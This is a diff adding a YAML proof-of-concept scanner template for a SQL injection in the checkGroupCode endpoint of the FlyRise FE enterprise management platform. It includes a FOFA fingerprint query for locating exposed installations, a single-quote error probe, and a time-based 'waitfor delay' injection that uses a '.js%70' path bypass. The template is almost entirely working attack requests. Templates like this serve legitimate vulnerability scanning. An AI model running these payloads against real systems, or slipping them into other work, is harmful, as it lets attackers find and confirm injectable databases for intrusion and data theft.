@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-fe-checkgroupcode-sqli
+info:
+  name: 飞企互联-FE 企业运营管理平台 checkGroupCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /docexchangeManage/checkGroupCode.js%70?code=1'
+  expression: status_code == 500
+- method: GET
+  path: /docexchangeManage/checkGroupCode.js%70?code=1';waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"isSuccess\":false") &&
+
+    contains(body,"\"info\":\"参数异常") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
